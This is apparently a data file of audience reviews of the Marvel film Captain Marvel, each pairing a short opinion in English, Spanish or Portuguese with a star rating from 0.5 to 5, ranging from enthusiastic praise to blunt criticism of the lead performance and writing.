"What's there to say that hasn't already been said? It's obvious that this movie was slapped together quickly in order to shoehorn Captain Deus Ex Machina into Avengers: Endgame, and it shows. The plot was all over the place and the lead character's performance was dull as dishwater. I can only commend this movie for the de-aging technology they used on Samuel L. Jackson, which is second to none.",1.5
Another Marvel movie that is just out of place....horrible and forced. Jokes were flat and a different actor or actress would of been nice....too late now. The filming was bad also....and the CGI was a little much....budget cuts?,0.5
Exceedingly dull and poorly written,0.5
"This is an average film as far as MCU output, in my opinion. Not terrible by any means, but not one I revisit unless I'm doing an entire MCU-rewatch. Others may find more enjoyment in it than I did, so I recommend giving it a shot. I just created this account to show Matt Jarbo that I didn't have to prove I paid to see it, in order to contribute to the audience score. Subscribe to Actual Fandom and Matt Jarbo on YouTube.",3.5
"RID√çCULO, PL√ÅGIO TOTAL!",0.5
I just don't like the plot enough to watch it again. I also feel that Brie Larson didn't fit the character of Captain Marvel. She may be a good actress but I wasn't able to see our main hero in her unfortunately.,3
Throughly enjoyed the movie!!,5
"Maybe it depends on me, but I had the feeling this movie had no connection to the rest of the MCU (except for the appearance of Mick Fury). But overall, an okay movie, but just kind of not necessary.",3
"While I respect the origin story and themes of Captain Marvel as a character, this is a film that makes the main hero WAY too overpowered that the third act is BORING. She is so powerful that the stakes and intrigue that the film builds don't matter because you know she's gonna kick everyone's butt. While it's nice to have an inspiring hero and a less strict and cynical Nick Fury, this is a flawed film that doesn't work.",2.5
My favorite of all the Marvel Films!,5
this movie would have been a train wreck without Samuel L Jackson,1.5
"Already a sub-par movie as is, but then you add Brie Larson to the mix, and this becomes a whole other type of garbage.",1.5
"I had really wanted to like this movie and had high hopes from the trailers but it turned out to be one of my least favorite Marvel movies. I know this is an origin story but in the end it does not seem like Captain Marvel is Earth's super hero as much as she is anybody but Earth's super hero. Didn't really see the personal interaction between the characters that I would have expected. It reminds me of meeting your grandparents when you were 8 years old back in the 60s & 70s before Skype and video calls. Your parents told you these old people were your grandparents and that you loved them so ... you did. Maybe you actually developed a relationship with them or maybe you just agreed that they were your grandparents and that you loved them. Danvers seems to be the latter. And BTW one of the things that annoys me about the whole ""Veers"" thing is that dog tags are last name first, first name last so her tags would have read ""Danvers, Carol"" so if you only had half of a dog tag to name her by her name would be Dan or Arol not Vers.",3
overhated but not the best,4
"I love this movie. It is fun to see this empowered hero figure out her past. It is a blast to see Nick Fury in his youth and get to know how he lost his eye. Love the story and the twist who the ""enemy"" actually is. This movie has a lot of dry wit in it. Pacing is beautiful, there are no dead spot, but you do get time for characters to bond. Can't wait to see the sequel.",4
"Buen√≠sima, presenta una super hero√≠na diferente a todo lo que hemos visto antes. Una mujer fuerte independiente y sumamente poderosa. Adem√°s la actuaci√≥n de Brie Larson es impecable como siempre. Espero ver mucho m√°s de este personaje tan incre√≠ble en el UCM",5
"This movie took the dreaded ""origin movie"" and made it even more bland by removing the character arc, either due to Brie Larsen's acting choices, the director, the writers, or a combination of all of the above. I couldn't tell you what really happens in this movie a couple years after having seen it. It's just such an also-ran... it's the Nissan of superhero movies. It's just there, taking up space that could have been filled by a better movie with a stronger message of hope and/or diversity, if that's what they were going for. I hate bland SO MUCH. Awful movies are more watchable than this yawn.",1.5
"it's not a bad movie, but it's definetly not one of the top marvel movies.",3
Second watch was by far better with more understanding. Still had a hard time connecting with Brie Larson's portrayal of Carol Danvers. Thankfully the supporting cast kept me interested!,3.5
"One star because if it was a B-movie i'd point the interesting plot around ""we are the bad guys"". But no : it's designed as a blockbuster. The worst. As a ""somewhat real production"" it feels uncomfortable just to imagine that people actually worked on the scenario, the dialogs and the actions. So weird. So many things are off the point that i give up already....",1
horribleeeeeeeeeeeeeeeee pero entretenido,0.5
"Mostly by the numbers Marvel movie, Sam Jackson elevated it beyond what it would have been. Brie Larson seems unusually reserved in the role, her Carol Danvers lacks a little charisma. She's supposed to be the most powerful character in the MCU, I guess? Curious to see if she becomes more important in later team films.",3.5
achei bacana o filme,5
One of the only Marvel films I really struggled to watch.,2.5
Pure garbage. So many lines of dialogue are just cringe worthy. The completely emasculated the Nick Fury character to make Captain Marvel look good.,0.5
"Oh wow, don't you just love it when your main character can just do everything she has to from the first minute and doesn't have to evolve or learn a lesson throughout their journey? Cool stuff indeed!",1.5
How was this certified fresh? Cringeworthingly terrible.,0.5
"The main character is bland. She's shown to be overpowered like Superman but unlike Superman she doesn't have charisma. Superman tends to move people because of his struggles of being a human. This woman on the other hand is, from the get-go, an outsider. She does not relate to human struggle and humans are essentially fodder to her. I saw this move in the theatres and while the visual effects were great, the story didn't seem appealing to me. Side characters were also all but forgettable except for the pre-established ones like Nick Fury. This is the kind of movie you watch when you have nothing better to do in life. On a scale of 1-10 I'd give it a 4.",2.5
"They tried so hard to force-feed the audience the ""girl power"" narrative that they forgot to develop any character traits for Carol. The longer I watched, the less I cared.",0.5
"Bland, boring, predictable.",1.5
A movie that highly under delivered.,0.5
"Very boring. You can't grow to love characters in this movie because it's too brief. CGI ruins most movies, would've rather seen more makeup. I found this movie to be corny",1
Love the strong female role. Love that it was set back in time.,4
If not for Sam Jackson's performance this movie would lose an entire rating level for me. Brie Larson seems wooden for a lot of the film and it is just another origin story that Marvel has done a thousand times over and better. Rating - Fine,2.5
most boring plot out of the entire mcu,1.5
"I like the movie the cat goose, but it was kind of boring.",3.5
A movie that could of been so much better with its potential. Bri Larsen as the main character shows a emotionless super hero that doesn't fit her role one bit. The writing was awful to. Someone's abilities to take down multiple ships but can't take down Thanos. Over all this movie is put in the books as one of the top worst marvel movies,1
"Unlike most origin stories,(looking at you every first Spider-Man movie). This film sores a hero most don‚Äôt know well and has a great mixture of plot, action, and comedy",3.5
"it is boring. probably a script pull out at the last minute to try and cash in from the success of Wonder Woman. not to mention it undermines the established characters of ""Nick Fury"". I won't be surprised if this was written by the same idiot that wrote ""Solo"".",0.5
Completely forgettable movie and definitely one of the worst MCU movies. Poorly written with probably one of the worst villains I've seen in recent times on the big screen.,1.5
"The hate is nonsense tbh, the movie is so great I love the plot and sequence of this movie!",5
Nothing particularly memorable about it other than the Nick Fury bits. The premise had promise but the main character is quite forgettable.,2.5
Creo que a estas alturas no hay nada que justificar,0.5
The movie was boring.,0.5
Feels less like a movie and more like an attack on sensibility! Could Larson be any more cocky? No depth or development to her character at all.,1.5
One of the better Marvel movies. Solid story from beginning to end.,4
"A real surprise, sci-fi mixed with real world works well here, liked how it was a prequel to everything that has gone before it.",4
Probably the most underrated movie of the MCU,3.5
"On paper, this is a great film... MCU in a retro setting, Kevin Feige producing, great supporting cast (Clark Gregg alive and well, young-ified Samuel L., Ben Mendelsohn has great energy)... but... the two main characters are not likable. In Jude Law's defense (spoiler alert), he's not really supposed to be. But Larson is definitely supposed to be likable, and her performance is just flat and dull. Nothing like the charisma of Gal Gadot or Scarlett Johansson. But everything that's wrapped around her is shiny and high-budget... so... Marvel!",2.5
"It was horrible since the start. It's difficult to follow for someone that knows nothing about this character... I wanted to like it, but it was boring.",0.5
The supporting cast was great. The main character had less personality than cheap bubble gum has flavor.,1.5
"Full of Action, Funny moments. Captain Marvel begins the story of what became The Avengers and why they were started in the first place with excellent story development.",4
One of the greatest Stan Lee cameos ever in a film but it's trapped in a shit movie.,0.5
If I somehow manage to hear Brie Larson be the most cocky woman on the face of the planet one more time without puking it would be a miracle.,0.5
This movie has no personality.,1.5
Larson sucked. Didn't mesh with the cast and the acting was rough. Not in the spirit of the rest of the marvel body of work,0.5
"I've seen Bre act in other films and she did a really good job, I don't know why it didn't show in this film, I blame the director.",0.5
Easily the worst MCU movie in the lot as of March 2022. I found the superhero to just be downright unlikable.,0.5
"A good but flawed marvel flick. captain marvel entertains the whole family! It has great themes, beautiful visuals and a hero you can look up to.",3.5
If Marvel executives and directors think this is an appealing movie to woman empowerment action. They would be so wrong. Feels like an insult.,0.5
"Ben Mendelsohn is the best part of it. Despite some solid visuals, the story itself was one of the weakest of the Marvel films.",2
"A great superhero origin story. This is not a new idea, but one we don't see much anymore, so it is fun to see Brie Lardon's Carol Danvers grow and develop in front of our eyes. Lynch, Mendelsohn, Law and Jackson are all great also, and while Brie Larson hasn't yet settled into the role, she's at a better starting position than most other heroes.",4
"I made an account just for this movie. I'm also gonna leave reviews of other movies that I have seen. However. I don't understand why people hated this movie. It's a great origin story. It is a bit rocky, but that's only because it's a superhero movie. Samuel Jackson is great as usual. The chemistry between him and Brie Larson are nice. I really did enjoy this. No matter how bad reviews it gets!",5
"Captain marvel is a good movie. For the first female led movie in the MCU I think it did pretty well. (This movie was and I think still is being review bombed) I personally think it lacked a bit of emotion, not with the main character, but from the villain. But who knows? Perhaps we'll learn more about him in the second movie.",4
"This was one of the worst movies I've ever seen. It was so bland, dull, and boring. I'm not sure if Brie Larson wasn't meant to play this character or if she received no direction, but Carol was so lifeless and unlikeable in this movie. None of the actors feel like they care at all when delivering lines. I wanted to quit this movie so many times but stuck it out for the connection to Endgame, and it was so not worth it. Just skip it.",1
"I was initially intrigued and interested by the fact it was female-led, but this was an abomination to the MCU. Honestly, this is the worst high-budget film I have ever watched.",0.5
One of the weaker MCU films. Character seems shoved in at the last moment.,3.5
very little villain development and was super cringe. Boring movie overall.,2
"Forgettable fluff! Brie is a boring, untalented actress that kinda makes this shit even worse",1
Unwatchable. I would seriously consider burning your tv/tablet/watching device.,0.5
"Its not bad movie, its just meh and with non emotional relation for the characters, except Nick fury. I think Black Wieow its a little bit better thatn this movie.",2
"Really liked it, it's not the best MCU movie but still a had fun watching it",3.5
"Good ideas, flawed execution. At the end of the film, you'll feel nothing and you won't have gone on a very deep emotional journey with Carol. Not enough clear character development or themes. The Skrulls are fun though and so is Past Nick Fury. The other good guys and the Kree antagonists fall flat however.",3
"Fair depiction of the 80s for sure, but it lacks originality in the development. My rating: 5/10",2.5
The overpowered protagonist is boring and everything is forgettable.,1
Captain Marvel should have been introduced way earlier as it builds her up to be very important in the upcoming movies.,1
"Arguably the worst Marvel movie I've ever seen, and for perspective on that statement, I've seen ""Hulk"" (no offense to Eric Bank, one of the greatest actors in the world). I could list its flaws, but I have better things to do. It has the overall quality of a made for TV movie. Not worth the full price ticket I bought to see it.",1
"Not sure why the audience reviews are so bad- most seem to have some other agenda rather than actually thinking the film was bad. As for me, I began this movie with low expectations, prepared for a very woke/feminist trashy plot with all the focus being on 'oh my god its a girl wow' and not much relevance to the MCU, I did NOT expect to be invested in the film at all. What I got was a plot that was actually almost an origin story for the MCU, with a healthy amount of girl power that was pleasant and not rubbed in the face, and quite a decent storyline with some cool action scenes and good humour. It's not the best film I've seen- the plot was a bit predictable in places and the after a certain point the villains didn't seem dangerous enough for the plot to feel threatened by them- but nonetheless I enjoyed seeing a less serious (and two-eyed!) version of Nick Fury and overall this film far exceeded my expectations; I enjoyed it more than I thought it would and certainly far more than reviewers who let some outside source affect their experience. Goose the cat/Flerken is the best character IMO. I'd recommend you watch it but please don't let some internet feud spoil it for you. Enjoy!",3.5
"Pior filme da MCU, humor for√ßado e hist√≥ria arrastada",0.5
The chemistry between Brie and Samuel L Jackson feels forced. Plus Brie Larson is trying super hard not to act. Story should focus on hero's journey but rather it tries to stir cultural poltics.,0.5
"I understand they want to create and elevate more strong female characters, but with Captain Marvel it's seem like that is the ONLY thing they focused on. This movie is riddled with glaring, plot holes and mediocre, lazy writing that often ignores, negates, and/or renders nonsensical, several elements previously established in the MCU. The development of the main character seemed rushed and is so shallow, one dimensional and forced, that it almost seems as if the message they were trying to convey was more important to them than the story itself or creating a complex, well rounded character, that is intended (I assume) to be a cornerstone in the next phase of the MCU.",2
Great movie about an all-powerful super hero who's only weaknesses are wooden dialogue and apathy.,0.5
"really enjoyed it. good story structure, great girl power.",4.5
"This movie is so ""woke"" it forgot to do anything else but spew culture politics, like you know; build any sense of a character instead of telling us what they are, have a consistent storyline with the rest of the MCU (looking at you Cthulhu cat), and just so many more things. The only good as with most Marvel film is the SFX/CGI. The rest of this movie can together with Brie as a human just be forgotten to history as a mistake.",0.5
"Seems like the movie was pushed out quickly for Captain Marvel to be pushed into Endgame. That being said, the movie doesn't take advantage of a potentially good origin story and the villain's.",2
Brie Larson and Nicholas are just perfect together. This movie is also great.,4
Not the best in the Marvel franchise but it ties in a lot of the movies. There are some really clever moments but they spend too much time preaching about the power of women while forgetting the movie is about a Woman who is the Most Powerful in the Galaxy......,3.5
A classic case of inheritance without sacrifice. As if being born with silver spoon in the mouth makes others empathize with them. Way over powered. No pain only gain...where's the fun in that,2.5
"the actress is horrible, an amateur, grandma pretends to like me and is a better actress than her! doesn't even compare to WARDA / SCARLET WITCH",0.5
"Nothing new, startling or punch-y. So by-the-numbers, the plot reminded me of those bad 1980s superhero movies, but with a bigger budget. The reveal was telegraphed, so anyone surprised by the twist wasn't paying attention, I guess. There was also a smugness by the main character I found to be sort of strange for a character that supposedly was trying to solve a mystery, like she already knew the ending of her own story and belittled anyone not keeping up.",2
"Its a real booster. A film to watch on a school day i might add. Its very fresh and cool! *its not for everyones taste but it sure is a blaster so, watch if u want sci-fi and wanna be cool ;)*",4.5
Another boring film. Brie Larson was nice like a toaster.,0.5
I wish they could have done better with the character. wasted so much potential.,1
My rating for the film is a 6.4/10,3
good movie the end is not good its have to match cgi,4
"Espectacular Movie, giving us a different perspective of a origin story since it's a female superhero. I know the girl empowerment this movies gives is strong and doesn't feel forced and as a man with no fragile masculinity I can say I loved that",5
The movie was mediocre at best. I only watched to connect some dots from other movies from the universe. The worst Marvel movie in my opinion.,1.5
"Captain Marvel is a decent superhero action movie. Great costumes and special effects. Fight scenes and chase scenes are excellent. The story is formulaic, but there is a plot twist that makes it more interesting. I love how the Kree and the Skrulls were designed and represented. I just don't agree with one of the casting choices. Humor is alright, but some lines and situations were too cheesy. The cat named Goose stole the show by being both adorable and badass. Carol Danver's origin was well told and presented. It was great to see young Monica Rambeau. I hope we get to see more of her in the future. My expectation for this movie was rather high, and I was hoping for more depth and substance, but I was still entertained, nonetheless. It's still a good addition to the ever-growing superhero roster of the MCU. Not to mention a good precursor to the much-awaited Avengers: End Game movie.",3.5
Larson is a great choice for the role. She brings welcome levity and verve to the movie. This is great as there's little else here that's worth recommending,3
"The first Marvel female hero solo adventure sadly fell way too short, as wit Ant-Man and the Wasp this movie exists for the sole purpose of introducing a new hero in the next Marvel big thing: Avengers Endgame. One would think that the adventures of a half alien half human superhero on Earth while trying to save a whole species from another planet from extinction would be fun to watch, add to this that it happens during the 90s and you have a great movie in front of you, but regardless of that they found a way to mess it up. The writing on itself doesn't feel bad, but the way the story is told is just awful, besides we don't get nothing new in here, just a generic story of good triumphing against evil with a very generic and underdevelop villain. Honestly this feels like Marvel Studios was just trying to take our money while we wait for Avengers Endgame, it feels like they were not even trying, shame on you Marvel Studios.",2.5
"It was an okay movie. Captain Marvel as a character I thought was kind of shallow, and I felt like the movie was a bit of a copy of ‚ÄòThor'.",3
I thought this was a great introduction to Captain Marvel.,4
"Worst MCU movie. Wasted so much potential for jokes that werent funny (Nick's eye.) The action is horrible, so predictable. Half of the movie doesent make sense. Worst MCU film, would rather watch Dark World for a day straight.",0.5
Bad choice in casting Brie Larson as the strongest superhero in the MCU. Brie Larsons awkward presence as Captain Marvel made this movie hard to watch. The plot wasn't bad but was limited by sloppy writing and awkward performance. 4/10.,2
"Too many people are being dishonest about this movie because they have an agenda. This is an honest review for those of you who are considering watching it. It's a pretty good Marvel film overall. If you enjoy the ongoing story continuing through the MCU, this one is worth watching. As a film, I'd put it in the area of Dr. Strange and Ant-Man. It's much better than ""Thor: The Dark World"" and not as good as ""Captain America: The Winter Soldier"" A fair rating for Audience Score would be more around 86%.",3.5
"Pretty flat plot. Brie Larson fails to make the character more than 1 dimensional ""badass"".",1.5
"boring action sequences (almost none but in the few action sequences there are, Danvers is invulnerable and the villains are just bad... so there are no stakes), bad jokes, horrible portrayal from Bree Larson (a missed opportunity on a great hero) and not even de soundtrack is good in Captain Marvel, memorable in every movie from the MCU. Besides, we wanted much more from Nick Fury and Phil Coulson. Finally, what they did with Mar-Vell... they disrespected every marvel comic fan in the planet.",1
"Decent but nothing special, Samuel L. Jackson saved the movie.",3
"Just awful, but then again that won't surprise man hating Brie, this film wasn't made for me. Apparently.",0.5
ABSOLUTELY AMAZING! People hate on Brie but she's awesome! The movie was one of the best marvel movies and is underrated! Love the storyline and her powers are so cool! I think people dislike her bc she's more powerful than Thor so that's a shame:(,5
"The story was boring and poorly thought out. Brie Larson fell flat and really makes Captain Marvel be an rude, condescending, arrogant and unlikable character. Kinda had me rooting for Thanos a little in Endgame. Definitely worth skipping.",1
"Had potential but the movie is let down by poor casting. Brie Larson is flat and wooden, while no amount of CGI can help Samuel Jackson be convincing as a younger version of himself. Captain Marvel's personal, inner struggle told by flashbacks to her struggle growing up is well done and probably the high point of the movie. And while the movie also includes some twists in the story, it movie never really comes together in an interesting way.",2
"I think this movie got it's hate because it released at the time where all anyone cared about was Endgame. The movie is far from flawless with a bit heaviness on the 90s references. Some lines in this film make scenes in Iron Man 2 with Phil seem out of place, example of this is the S.H.E.I.L.D acronym being a thing in the 90s but Iron Man 2 Phil couldn't think of it at all until the end. The origin story is told in a fine way and empowers a female lead in a wonderful way but leaves some things unexplained like how the tech works.",3.5
It took me along time to actually like Captian marvel and the bad guy plot wasn't that good.,2.5
"What I love about Marvel movies is that they seem to wow me, whether it's with a specific character, or just with humor mixed with with some great action, this delivered on none of this, and while it was fine for some, I guess, I had to stop myself from walking out multiple times.",1.5
Review bombers for The Last Jedi and this are proof as to why the audience rating is bullshit.,4
It was a good film just could've been so much better,3
"Probably the worst marvel movie but had potential. They change the character to much to fit the actress and that was the wrong move since she is the complete opposite from Captain Marvel, she has the look for the character but other than that she may not be the right fit in the long run for Captain Marvel",1.5
"Underrated gem of the MCU genre, Captain Marvel is one of the few times ""girl power"" doesn't feel so forced. Predictably, the attempts to shoehorn American militarism into a story that never needed it alongside ""girl power"" hold it back.",4
"I missed out on it when it released, Fully watched it yesterday, Terrible story with main character acting worse than a scarecrow, giving it half a point because Samuel L. Jackson made the screen a lot more pleasant & tolerable.",1
"Sadly,Nick Fury caried the movie so much, that now I think he has back problems. I loved all of his scenes , especially the ending scene, which is very important to the whole MCU plotline thing. Cpt Marvel's powers are kinda interesting, but also kind of too simple, the storyline was alright.",2.5
"An enjoyable, empowering story.",5
"This movie felt like the longest movie I've ever watched. So much potential in this story, yet it's terrible. An hour in I thought the movie had to be almost over. Turns out, I was only an hour in, halfway through. Almost unable to finish it.",0.5
Such potential and allot of disappointment throughout the entire movie sadly it‚Äôs definitely a girls movie as my aunty and daughter loves the movie but it just had allot of problems while the visuals look good but the dialogue and story writing character development or lack of it‚Äôs just hard to watch and find myself pulling out the phone and checking out movie new over this it‚Äôs that bad I usually give movies a chance but it‚Äôs not redeemable. Opens the potential of knocking it out the park on the upcoming sequel so theirs that,2.5
"This was terrible, one of the worst superhero movies ever, that's pretty bad",0.5
"boring, predictable, and not essential movie. brie is not very good at acting also",0.5
The movie wasn't that good the character was acting like it is not real,3
"An origin story that the truth is very well developed, the problem is the characters, which I think, they made them very funny and with little seriousness, and I mean all the characters: protagonists, secondary and antagonists. I think the visuals look very good, but I wouldn't say they're surprising, and the music, to be honest, leaves a lot to be desired. In conclusion, I would say that without problems it is a tape that can be eliminated from the equation that is Marvel without any problem, since more than anything it only serves as context so that we know the character before seeing Avengers: Endgame. So, to finish, I would say that it is a Blockbuster that serves to have a good time, but other than that, I think there is no room for more",3
A so-so superhero film that doesn't do anything special to make you want to watch it a second time. Character development is nonexistent and action scenes are ok at best. Most of the humor is mediocre and sometimes a few badly placed jokes ruin scenes.,2.5
Captain Marvel as a character is hard to root for.,2
"I went into this movie thinking it would reign supreme, primarily for being a female leading Marvel movie, the first for the MCU. The movie was a bit dry and drab, but nevertheless, a powerful super hero was born.",3
People who complain about this movie live in the basement and think Ayn Rand is highly intelligent.,5
Oh boy where to start.. How to not write a strong female character maybe? This was nothing but embracing a Mary Sue with cringe-worthy tropes against men.. seriously thank god Marvel made Black Widow(which is definitely better) so we could laugh at this even more Also the main actress.. I believed her acting in no second of the movie whatsoever,0.5
"An awesome, hilarious, well over-due movie!",4
"Wayy too much outer space and confusion, yeah I suppose learning about the creatures this early on helped me understand easier down the line while watching the other films though. (2/23)",2
"Muito ruim, √© a pior vers√£o da f√≥rmula Marvel.",2
"Captain Marvel has a lot of problems, and while not a bad movie, it is just an ok movie as a result. The movie has an ok plot, but it suffers most from the pacing issues, and with an uninteresting lead character at the front of every scene there are a lot of dead points in the film where it feels like nothing is happening. The film could probably be trimmed down to an hour and twenty minutes and nothing would be lost. Luckily for the film though all the other characters around Carol keep this movie afloat, and are the best parts of this movie, especially the main villain Talos. If doing a rewatch of the Marvel Cinematic Universe I have to label this movie as a pass, and especially if doing a bare minimum view of the Marvel Cinematic Universe stay away from this movie.",3
Very boring and flat. Main character is unlikeable.,1
"Samuel L. Jackson as Nick Fury makes this one worth watching, but Captain Marvel is a bland hero with vaguely defined powers and a boring backstory. It's fun at times, but doesn't have the same heart that other MCU movies have.",3
"I really liked this film, and thought it was a great story, with some really great acting and awesome action scenes. I don't understand why people are hating so badly on this film, and I think Brie Larson and the supporting cast are all doing a superb job, along with the crew doing some really stellar work as well. While the film might not be on par with the best stand-alone MCU films, which include Captain America: The Winter Soldier, Black Panther, Iron Man, Thor: Ragnarok and Shang Chi, it is definitely not as bad as either Thor: The Dark World, Iron Man 2 or Iron Man 3. I chose to give it a higher score than it deserves, because I honestly do not believe this film, which has one of the most brilliant actresses out there in the main role, especially if you have seen Room, deserves the amount of hate it gets.",5
"Mediocre acting. Weak plot. Thin character or just bad acting. Watching Larson in other marvel movies, I'm going with bad acting. She's sterile and emotionless.",1
"I give it 1 star instead of 1/2 star because the CGI is sometimes okay. Otherwise there is little to enjoy. Especially Brie Larson's acting, which is outrageously bad.",1
"The biggest issue I have with this movie is the lack of a heroes journey. Here, we have an ultra overpowered superhero who feels more like an entitled brat who can do whatever they please. The personality doesn't change throughout the movie, nor does it change in any other appearance she has made. It is a terrible, bland movie starring an uninterested actress who, when watching, feels like she would rather be anywhere else.",1.5
I'll never understand the hate around this movie. It's ultimately a good movie and defintely better than half of MCU.,3.5
"Captain marvel added to the MCU by expanding on the past, and how it affects the present. And although the movie is a bit lackluster in terms of creating emotional bonds to characters, the fight scenes are on point.",3.5
"Yeeesss all time favorite, love Brie Larson, love the unexcused feminism, love the story!",5
I was lost from the beginning. Halfway thru i kind of figured out what was going on but by then I lost hope of understanding the overall plot and only focused on the action scene by scene. It took the end of the movie to completely spell it out for me to understand what i just watched.,2
waste of time and a waste of actors that could be used in a better engaging feminist film.,1.5
"First the good stuff: 1. Samuel L. Jackson: He played a more softened Nick Fury, but very much ""agent coulson prior avengers"" like, with a lot of attitude, sarcastic humor and less serious. Also the de-aging is becoming so good, that you wouldnt even be able to notice it even if you really looked. His character was very well done on script and screen. 2. Some of the action: The space battle stuff etc. was very well done. the special effects team did an amazing job at this movie. nothing felt or looked fake. kudos! 3. Surprise surprise: the story. From the trailers you would not be able to predict this but the story is actually really interesting. The way they introduce her past was very originally done. The way she remembers things through different ways was clever.. very clever even, because it doesnt make her past like an obstacle you first gotta go through.. it added to the story while adding to her character. Also multiple twist and 1 big one that even got me thinking for a while. 4. Ben Mendelson: really impressive job. very layered surpringsly and stand out in my books. the acting is general was very good the bad: 1. It misses spectacle... and a standout moment. in thor 3 for example; you had the intro scene, and the end scene which were big standout moments and a manifestation of thor's powers. i feel you didnt get that in this movie. 2. Like I said the story was great, the execution a.k.a. the screenplay/script lacked... they had such great storypoints, but they were all done so quickly and those moments lacked emotion. the friendship between carol and her friend didnt feel real. she seemed to have a more genuine relationship with her kid rather than with her and that bothered me a bit, since they seemed all buddy buddy in the past and even during some moments in the film where i was like; ""but you didnt deserve that yet..."" Ben's character had a more emotional impact on me than carol... yikes!! (and i dont mean that in a killmonger-t'challa kind of way) 3. some of the action again: some action just wasn't good. there is a moment she is fighting the skrull(the moment she yells at the skrull in the trailer) and that whole fighting sequence was horribly filmed and choreographed... which is weird, because she another scene where she is fighting the skrull in the film and then the action seemed way better filmed. All in all, the film was good. nothing more and nothing less. i missed an emotional attachment to the main character. I felt like i still didnt know her after the film, and i think that's because they tried to give her a certain personality that just didnt fit the film. she was supposed to be a bit arrogant, but i wouldve loved to see more vulnerablity in a woman that is the STRONGEST creature in the world and they made me believe that btw. she come across as amazingly powerfull at one point in the film. believe me! Wonderwoman's vulnerability and her femine side me fall in love with the character and they stripped that away fromm carol, and basically made her less relatable. I's definitely a good time in the theatre and some of the scenes are quite the spectacle and i loved the shock and awe that some scenes provided. especially the way she got her powers. Go see it.",3.5
"Below-par for the MCU. Powerful women in cinema have rocked for decades, and don't need to be so obvious.",1.5
This is one of the worst marvel movies. You can clearly see that this wasnt made by someone who wanted to tell an amazing story but by someone who wantend to make money and push there politic agenda into the marvel universe. The Story is okay and the setup is good. But the execution is unbelivalby bad. The cat had the most chacater developpment. And the worst thing is how silly they wanted to make Nick Fury. It just doesnt sits right with me how he his character just always followed the main character and was basicly just there so people could have a familiar face. All in all its a shit movie dont watch it.,0.5
"There's just not enough female heroes like this. Great story, love the twist and the assumptions we make being challenged.",4.5
As a huge fan of Captain Marvel from her Ms. Marvel days I loved this MCU adaptation. Brie Larson did a great job getting her personality down. Can't wait to see more of her in the MCU.,5
"I've never seen someone with less charisma on screen than Brie Larson, whose acting was so hollow in this film. The character is never developed into someone you even care about and the story just isn't very interesting. I love Samuel Jackson and even he couldn't save this film. This is the worse Marvel movie I have seen so far.",0.5
such a good flick. she is so strong. cant wait to watch this character grow,5
"Here's the odd thing: the story is actually pretty interesting. What killed this movie was Brie Larson. She just comes across as unlikeable. And an unlikeable hero is no bueno in a superhero movie. If a different actress was cast as Captain Marvel, this film would feel really different‚Äîa much more positive vibe. We've seen protagonists with memory issues about their past in other movies (like Jason Bourne) so it's not like heroes with amnesia have to be portrayed the way Larson does it. But she does it in a way that's just no fun. So we don't root for Carol Danvers like we did for Jason Bourne.",2
"I rewatched the movie yesterday and it was really entertaining, a good Marvel movie at its best",4.5
"This film was shit, had to stop watching then pick up again just to finish it. Larson comes off as flat throughout the whole film except when shes acting the part of a cocky mary sue which i doubt was awfully hard as it reflects her real life persona. Method acting on another level...",1.5
"The film is nothing special and lacks much of the charm that other MCU films carry with them. Samuel L. Jackson carries this movie, though Brie Larson also does fine, and the banter between the two is often enjoyable to watch. The action sequences are done very poorly, and the CGI at parts does not hold up. The film also felt very preachy at parts, and it constantly tries to force a message down you're throat. The direction that the movie goes in, however, is good, and I think that it ties in wonderfully in the MCU. Overall, the film is very generic, just with an added dose of preachiness that I felt was unnecessarily added.",2
"me encanto mi capidiosa se veia increible, no puedo esperar a ver la secuela de Brie Larson",5
"Brie Larson's first outing as a Marvel character. To say that this feature had potential, is an understatement. Nothing but bland and boring from start to finish, and I only went to see it, because it's supposed to have been tied into one of the most successful films of all time.",1.5
"I am here because I think getting a bad rating for saying critics who do not understand a story should not be reviewing it is not a good excuse to badly rate a good movie, it is a load of BS. Love the movie woman power, and very nostalgic.",5
"Brie Larson looks so bored in the movie, her character looks as if someone bankrupted her family and now she's seeking revenge. I do think she is a great actress, especially enjoying her character in Scott Pilgrim, but this movie made as her dull as a potato, unfortunately. Highly recommended if you have insomnia.",0.5
"If you've watched all the others, you may enjoy it or at least want to watch it for completion of the MCU. Otherwise, this is one of the more skippable movies in the franchise.",2
Really dull & irritating. Tries too hard to be empowering & ends up annoying,0.5
love captain marvel. cant wait for the sequel.,5
"I wanted to like it, but they trade storytelling, plot, humor, character development, quality, and entertainment for a strong female role model with no flaws or growth in herself or her powers. If you want to know the fastest way to make an unlikeable character and a boring preachy movie this movie is a masterclass. I wish it was done better I wanted the marvel version of wonder woman just as much as the next guy but it wasn't to be.",0.5
"This movie is just another example of how stale our modern movie world has gotten. It is preachy, not fun. It is annoying, not progressive. When half of the Marvel fans are men, it is a bad idea to make men seem like stupid, weak, and lame pushovers in your films, because I being man do not generally like it. I do not like Mary Sue's who stand above men like some sort of super human. This movie is flash but has nothing more going for it. It just feels like Captain Marvel is about a strong woman fighting against a world that is against that, but the thing is most men support women, we just do not like it when women try to portray us as being the worst things in the universe.",1
absoultly horrible. sooooo boring it took me 3 attmepts to watch the movie without sleeping. captain marvel is so boring the action is bad and your telling me nick fury lost his eye from a FRICKING CAT!!! nick fury is the only good thing about this movie. dont watch this worst marvel movie by far.,0.5
"Me gust√≥, en mi opini√≥n es una buena historia de origen, amo a Brie y amo el hecho de que seguir√° apareciendo en el MCU",5
One word: dull. Very dull.,1
incongruencias con el resto del universo un guion y trama floja y una protagonista aburrida pues da esta peli.,0.5
worst marvel movie ever super bland,0.5
Loved how it showed someone proving themselves. Not to others. Good visuals. Always thought they needed new directors though. Shouldn't be co-directors for a movie on that gravity. Too many conflicting ideas and voices on what should be put in and how to portray her. I'm sure the Marvels will have more action and showing her weaknesses.,4
"Thought this movie was amazing, one of my favourite marvel movies",5
Awful. Need a clear story rather than one that leans on the supporting cast too much,0.5
Love the soundtrack and love the 90's vibes. Brie is a total badass bae queen!,5
BADASS! I love the fact that there is zero cliche love story. Captain Marvel is on a mission and she aint got time for generic love plots. Love it!,5
She so badass I love her!,5
Want really a fan unfortunately.,3

"Porqueria mal implementada, aburridisima, estupida, decepcionante, forzada, y mal hecha.",0.5
"It is a bit of a clunky film at times with odd pacing at some points. The stuff with Anette Bening and all the flashbacks made the film hard to follow at some points, however, the film is still a joy to watch and the dynamic between Samuel L Jackson and Brie Larson is quite enjoyable.",3.5
"Secondary film. Good cast, acting. Otherwise, everything is not so rosy. In my opinion, the most memorable movie in the history of Marvel, how much time has passed and it has not remained in my head.",3
